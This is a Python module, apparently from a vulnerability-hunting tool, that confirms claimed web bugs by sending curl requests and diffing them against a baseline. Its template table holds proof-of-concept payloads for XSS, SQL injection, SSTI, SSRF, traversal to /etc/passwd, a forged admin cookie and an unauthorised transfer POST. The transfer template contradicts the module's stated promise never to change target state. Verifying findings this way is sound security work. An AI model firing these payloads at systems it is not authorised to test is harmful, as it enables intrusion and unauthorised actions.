"""PoC execution gate — web2 variant (HTTP curl + diff baseline).

Where ``poc.py`` is the web3 ``forge test`` runner, this module is its
web2 sibling: it replays the claimed exploit against a live (or local) target,
captures the response, and compares against a baseline request.

Design rules
------------
* ``run_poc_web2(finding, target)`` is a deterministic subprocess call.
* Returns ``{"ok": bool, "output": str, "exit_code": int, "diff": str}``.
* The "baseline" is the same request WITHOUT the attack payload — a clean
  request on the same endpoint must give a DIFFERENT response for the PoC
  to be considered proven.
* Never mutates target state — uses read-only GET/POST where possible.
* TIMEOUT = 15 s, so a hung PoC never blocks the hunt.
"""

from __future__ import annotations

import json
import re
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Any

# ── mappings: finding vuln_type → HTTP method + payload ───────────
# These are minimal constructive payloads designed only to prove
# reachability — never to cause real harm.

_POC_TEMPLATES: dict[str, dict[str, str]] = {
    # injection family
    "reflected-xss": {
        "method": "GET",
        "payload_qs": "q=%3Cscript%3Ealert%28%27PoC%27%29%3C%2Fscript%3E",
        "check": "alert('PoC')",
    },
    "sql-injection": {
        "method": "POST",
        "payload_body": "username=' OR 1=1--&password=x",
        "check": "syntax error|sqlite|postgres|mysql",
    },
    "ssti": {
        "method": "GET",
        "payload_qs": "name=${{7*7}}",
        "check": "49",
    },
    "ssrf": {
        "method": "GET",
        "payload_qs": "url=http://127.0.0.1:1/poctest",
        "check": "refused|connection|error",
    },
    "path-traversal": {
        "method": "GET",
        "payload_path": "../../../../etc/passwd",
        "check": "root:",
    },
    "open-redirect": {
        "method": "GET",
        "payload_qs": "url=https://poc.example.com",
        "check": "poc.example.com|Location.*poc.example",
    },
    # auth family
    "auth-bypass": {
        "method": "GET",
        "payload_header": "Cookie: role=admin",
        "check": "",  # any 200 vs 403 is proof
    },
    "unauth-action": {
        "method": "POST",
        "payload_body": "from=attacker&to=victim&amount=1",
        "check": "transfer|success|ok",
    },
    # info family
    "info-disclosure": {
        "method": "GET",
        "payload_path": "",  # the endpoint itself IS the proof
        "check": "",
    },
    "sensitive-file": {
        "method": "GET",
        "payload_path": "",  # same — endpoint == proof
        "check": "",
    },
    "missing-headers": {
        "method": "HEAD",
        "payload_path": "",
        "check": "",
    },
    "directory-listing": {
        "method": "GET",
        "payload_path": "",
        "check": "<a href",
    },
}

# When the template has no method, we use a plain HEAD probe to prove the
# endpoint is reachable — the bug is that it exists exposed, not that a
# payload triggers it.

_DEFAULT_TEMPLATE = {"method": "GET", "payload_path": "", "check": ""}

# ── helpers ────────────────────────────────────────────────────────

def _match_type(title: str) -> str | None:
    """Return the best-matching vuln_type for a finding title."""
    title_lower = title.lower()
    for vt, kwds in (
        ("reflected-xss", ("xss", "cross-site")),
        ("sql-injection", ("sqli", "sql injection", "sqlite", "sql error")),
        ("ssti", ("ssti", "template injection")),
        ("ssrf", ("ssrf", "server-side request")),
        ("path-traversal", ("path traversal", "traversal", "directory traversal")),
        ("open-redirect", ("open redirect", "redirect")),
        ("auth-bypass", ("auth bypass", "auth. bypass", "cookie", "role cookie", "forge")),
        ("unauth-action", ("unauth", "missing authorization", "unauthenticated", "/transfer")),
        ("info-disclosure", ("info disclosure", "info leak", "information")),
        ("sensitive-file", ("sensitive", "backup", "users.sql", "credential")),
        ("missing-headers", ("missing security headers", "csp", "xfo", "xcto")),
        ("directory-listing", ("directory listing", "dir listing")),
    ):
        if any(k in title_lower for k in kwds):
            return vt
    return None


def _curl(method: str, url: str, *, path: str = "", qs: str = "",
          body: str = "", header: str = "", baseline: bool = False) -> str:
    """Construct & execute a single curl, return stdout."""
    if not url.startswith("http"):
        url = "http://127.0.0.1:8941"  # fallback — caller should supply
    if path:
        url = url.rstrip("/") + "/" + path.lstrip("/")
    if qs and not baseline:
        url += ("&" if "?" in url else "?") + qs
    cmd = ["curl", "-sk", "-m", "15", "-o", "-", "-w", "\n%{http_code}"]
    if header and not baseline:
        cmd += ["-H", header]
    cmd += ["-X", method]
    if body and not baseline:
        cmd += ["-d", body]
    cmd.append(url)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        return proc.stdout
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as exc:
        return f"ERR:{type(exc).__name__}"


# ── public entry point ────────────────────────────────────────────

def run_poc_web2(finding: dict, target: str = "http://127.0.0.1:8941",
                 timeout: float = 20.0) -> dict[str, Any]:
    """Execute a web2 PoC: curl + baseline diff.

    Returns ``{"ok": bool, "output": str, "exit_code": int, "diff": str}``.
    """
    title = str(finding.get("title") or "")
    vt = _match_type(title)
    if vt is None:
        # try the explicit field
        for key in ("vuln_type", "klass", "vuln_class"):
            vt2 = _match_type(str(finding.get(key, "")))
            if vt2:
                vt = vt2
                break
    tmpl = _POC_TEMPLATES.get(vt or "", _DEFAULT_TEMPLATE)
    method = tmpl.get("method", "GET")
    path = tmpl.get("payload_path", "")
    qs = tmpl.get("payload_qs", "")
    body = tmpl.get("payload_body", "")
    header = tmpl.get("payload_header", "")
    expected = re.compile(tmpl.get("check", "."), re.I | re.S)

    # 1) baseline (same request, no payload)
    base_out = _curl(method, target, path=path, qs="", body="",
                     header="", baseline=True)

    # 2) attack (with payload)
    atk_out = _curl(method, target, path=path, qs=qs, body=body,
                    header=header, baseline=False)

    # 3) verdict: baseline must DIFFER from attack (or attack signals presence)
    base_lines = base_out.strip().split("\n")
    atk_lines = atk_out.strip().split("\n")
    base_code = base_lines[-1].strip() if base_lines else ""
    atk_code = atk_lines[-1].strip() if atk_lines else ""

    # When the bug is that the endpoint exists at all (no payload needed),
    # the baseline IS the proof — a 200 is the finding.
    if not qs and not body and not header and not (tmpl.get("check", "")):
        ok = atk_code.isdigit() and atk_code in ("200", "302")
        return {
            "ok": ok,
            "output": atk_out[:2000],
            "exit_code": 0,
            "diff": "endpoint reachable — existence is the bug" if ok else f"HTTP {atk_code}",
        }

    # For payload-based attacks: the attack response must differ from baseline
    base_body = "\n".join(base_lines[:-1])
    atk_body = "\n".join(atk_lines[:-1])
    diff = ""
    if base_body != atk_body:
        diff_lines = []
        bl, al = base_body.splitlines(), atk_body.splitlines()
        for i in range(max(len(bl), len(al))):
            if i >= len(bl):
                diff_lines.append(f"+{al[i]}")
            elif i >= len(al):
                diff_lines.append(f"-{bl[i]}")
            elif bl[i] != al[i]:
                diff_lines.append(f"-{bl[i]}\n+{al[i]}")
        diff = "\n".join(diff_lines[:40])
    # check for expected signal
    signal = bool(expected.search(atk_body))
    ok = (base_code != atk_code) or (base_body != atk_body) or signal
    return {
        "ok": ok,
        "output": atk_out[:3000],
        "exit_code": 0 if ok else 1,
        "diff": diff[:2000],
    }